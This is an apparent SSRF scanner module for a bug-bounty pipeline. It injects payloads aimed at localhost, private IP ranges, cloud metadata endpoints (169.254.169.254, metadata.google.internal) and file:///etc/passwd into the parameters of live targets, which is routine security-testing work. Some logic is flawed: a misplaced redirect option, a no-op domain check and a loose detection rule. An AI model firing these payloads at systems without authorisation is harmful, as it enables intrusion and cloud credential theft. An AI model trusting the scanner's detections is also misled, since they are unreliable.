import { buildFindingId } from './ScanResult.js';
import { Logger } from '../Logger.js';
const LOG = new Logger('SSRFScanner');
// Domains that are third-party tracking pixels — never test these for SSRF
// These legitimately forward URL params to external services (Google Analytics,
// AdSense, etc.). A "response from localhost" when injecting a tracking pixel URL
// is NOT SSRF — it's just the tracker doing its normal job.
const THIRD_PARTY_TRACKING_DOMAINS = new Set([
    // Google
    'google-analytics.com', 'googletagmanager.com', 'googlesyndication.com',
    'doubleclick.net', 'googleadservices.com', 'google.com', 'googleusercontent.com',
    'googleapis.com', 'googletag.com', 'gstatic.com', 'googleads.g.doubleclick.net',
    'pagead2.googlesyndication.com', 'stats.g.doubleclick.net',
    'www.google-analytics.com', 'www.googletagmanager.com',
    // Facebook/Meta
    'facebook.net', 'facebook.com', 'fbcdn.net', 'connect.facebook.net',
    // Analytics & tracking
    'hotjar.com', 'segment.io', 'segment.com', 'mixpanel.com', 'amplitude.com',
    'mouseflow.com', 'crazyegg.com', 'newrelic.com', 'nr-data.net', 'datadog.com',
    // Customer success / NPS
    'pendo.io', 'intercom.io', 'crisp.chat', 'drift.com', 'zendesk.com', 'zdassets.com',
    'intercomassets.com', 'intercomcdn.com',
    // Ad networks
    'adsrvr.org', 'adnxs.com', 'rubiconproject.com', 'pubmatic.com',
    'openx.net', 'casalemedia.com', 'sovrn.com', 'criteo.com',
    'taboola.com', 'outbrain.com', 'revcontent.com', 'quantserve.com',
    'scorecardresearch.com', 'comscore.com',
    // Other known third-party
    'crashlytics.com', 'fabric.io', 'appsflyer.com', 'braze.com', 'appboy.com',
    'urbanairship.com', 'leanspring.com', 'bat.bing.com', 'bat.r.msn.com',
    'px.ads.linkedin.com', 'snap.licdn.com',
    'twitch.tv', 'twitchcdn.net', 'jtvnw.net', 'cloudflare.com', 'cloudfront.net',
    'adj.st', 'adsymptotic.com',
]);
function isThirdPartyTrackingDomain(url) {
    try {
        const hostname = new URL(url).hostname;
        // Check exact match and parent-domain match (e.g. www.google-analytics.com → google-analytics.com)
        if (THIRD_PARTY_TRACKING_DOMAINS.has(hostname))
            return true;
        const parts = hostname.split('.');
        if (parts.length >= 2) {
            const parent = parts.slice(-(parts.length === 4 && parts[0] === 'www' ? 2 : 2)).join('.');
            return THIRD_PARTY_TRACKING_DOMAINS.has(parent);
        }
        return false;
    }
    catch {
        return false;
    }
}
const SSRF_PAYLOADS = [
    // Standard SSRF
    'http://localhost/',
    'http://127.0.0.1/',
    'http://[::1]/',
    'http://169.254.169.254/latest/meta-data/', // AWS metadata
    'http://metadata.google.internal/', // GCP metadata
    'http://10.0.0.1/',
    'http://172.16.0.1/',
    'file:///etc/passwd',
    // Callback URLs (if a callback service is configured)
];
// Timeout for SSRF checks (short – we just need a connection/open/timeout)
const SSRF_TIMEOUT_MS = 5_000;
async function testParamForSSRF(endpoint, paramName, payload, config) {
    const testUrl = injectParam(endpoint.url, paramName, payload);
    try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), SSRF_TIMEOUT_MS);
        const response = await fetch(testUrl, {
            method: endpoint.method,
            signal: controller.signal,
            headers: {
                'User-Agent': 'Mozilla/5.0 (compatible; SSRFScanner/1.0; +bounty-pipeline)',
                // Don't follow redirects – SSRF is detected via connection to internal IPs
                redirect: 'manual'
            },
            body: endpoint.method !== 'GET' && endpoint.method !== 'HEAD'
                ? (endpoint.formFields.length > 0 ? new URLSearchParams(endpoint.formFields.map(f => [f.name, 'test'])).toString() : undefined)
                : undefined
        });
        clearTimeout(timer);
        // If we get a response from localhost/127.0.0.1, it's likely SSRF
        if (response.status < 500 && response.status !== 0) {
            return { param: paramName, payload, detected: true, reason: `Response received (status ${response.status}) from internal resource` };
        }
        return { param: paramName, payload, detected: false, reason: 'No response' };
    }
    catch (err) {
        const e = err;
        // Connection refused / timeout = potentially filtered/blocked by SSRF protection
        if (e.name === 'AbortError') {
            return { param: paramName, payload, detected: false, reason: 'Request timed out – target may be filtered' };
        }
        // Connection errors to internal IPs are interesting
        if (e.message?.includes('ECONNREFUSED') || e.message?.includes('ENOTFOUND') || e.message?.includes('ETIMEDOUT')) {
            // These errors on internal addresses suggest the request was attempted
            return { param: paramName, payload, detected: false, reason: `Connection error (possible SSRF attempted): ${e.message}` };
        }
        return { param: paramName, payload, detected: false, reason: String(err) };
    }
}
/**
 * Scan for SSRF by injecting known SSRF payloads into URL parameters
 * and looking for successful connections to internal/cloud-metadata resources.
 */
export async function scanForSSRF(targets, _stack, config) {
    const findings = [];
    for (const endpoint of targets) {
        // Skip third-party tracking pixels — these are not SSRF vulnerabilities
        if (isThirdPartyTrackingDomain(endpoint.url)) {
            LOG.log(`[SSRF] Skipping third-party tracking domain: ${endpoint.url}`);
            continue;
        }
        // Only test endpoints that have URL parameters (SSRF is primarily in URL params)
        const urlParams = endpoint.params.filter(p => p.location === 'query');
        if (urlParams.length === 0)
            continue;
        // Also check form fields that accept URLs
        const urlFields = endpoint.formFields.filter(f => /url|link|href|src|dest|redirect|uri|path|continue|return|next|data|reference|site|html|val|validate|dest|callback|jump|to|out|view|dir|show|nav|open|page|feed|host|port|error|continue|route|action|do|security|q|search|query|keyword|command|execute|fetch|table|ascii|value|callback|param|namespace|aspxerror|file|document|folder|type|class|clip|plain|content|test|api|frame|json|oembed|slug|callback|screen|option|load|module|name|page_id|cat|subject|id|customer|username|uuid|key|pin|row|subject|cat|info|access|code|auth|token|term|q|user|role|author|date|month|img|image|country|timezone|locale|api_key|void|call|card|cc|client|cpf|cvv|email|geolocation|hashtag|ip|jsonp|language|msisdn|number|offset|output|page|pag e|pass|prince|profile|properties|ref|referrer|secret|sig|signature|ssn|state|status|store|success|summary|tag|target|ticket|ttl|type|uid|username|value|ver|version|view|vitrine|xs|weblogin|wx|zip/i.test(f.name));
        const allParams = [...urlParams.map(p => p.name), ...urlFields.map(f => f.name)];
        for (const paramName of allParams) {
            for (const payload of SSRF_PAYLOADS) {
                if (config.dryRun) {
                    LOG.log(`[DRY_RUN] SSRF test: ${endpoint.url} param=${paramName} payload=${payload}`);
                    continue;
                }
                const result = await testParamForSSRF(endpoint, paramName, payload, config);
                if (result.detected) {
                    findings.push({
                        id: buildFindingId(endpoint.url, paramName, 'ssrf'),
                        url: endpoint.url,
                        type: 'ssrf',
                        severity: payload.includes('169.254') || payload.includes('metadata.google') ? 'CRITICAL' : 'HIGH',
                        cvss: payload.includes('169.254') || payload.includes('metadata.google') ? 10.0 : 8.1,
                        tool: 'ssrf-scanner',
                        param: paramName,
                        description: `SSRF via parameter '${paramName}' – payload targeted ${payload.includes('169.254') ? 'AWS metadata service' : payload.includes('metadata.google') ? 'GCP metadata service' : 'internal resource'}`,
                        evidence: `Payload: ${payload} | ${result.reason}`,
                        createdAt: new Date().toISOString(),
                        references: [
                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                            'https://portswigger.net/web-security/ssrf'
                        ]
                    });
                    break; // one finding per param
                }
            }
            // Rate limit between tests
            await new Promise((r) => setTimeout(r, config.rateLimitMs));
        }
    }
    LOG.log(`SSRFScanner: ${findings.length} findings`);
    return findings;
}
function injectParam(url, paramName, value) {
    try {
        const u = new URL(url);
        u.searchParams.set(paramName, value);
        return u.href;
    }
    catch {
        return `${url}${url.includes('?') ? '&' : '?'}${encodeURIComponent(paramName)}=${encodeURIComponent(value)}`;
    }
}
